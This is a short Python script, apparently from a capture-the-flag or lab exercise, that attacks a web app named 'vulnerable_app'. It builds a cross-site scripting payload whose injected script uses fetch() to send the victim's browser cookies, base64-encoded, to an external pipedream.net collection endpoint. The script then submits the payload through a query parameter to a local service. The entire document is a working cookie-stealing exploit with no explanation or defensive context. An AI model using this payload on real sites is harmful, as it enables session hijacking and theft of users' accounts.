import requests
from urllib.parse import quote_plus

TARGET = 'http://vulnerable_app:5000'
payload = "<script>fetch('https://enffe5hghjjuh.x.pipedream.net/?'+btoa(document.cookie),{method: 'GET',mode: 'no-cors'}).then(x=>x.text());</script>"
if __name__ == "__main__" :
    r = requests.get('http://localhost:5001' + '/', params={'value': '/?value=' + quote_plus(payload)})
    print(r.request.url)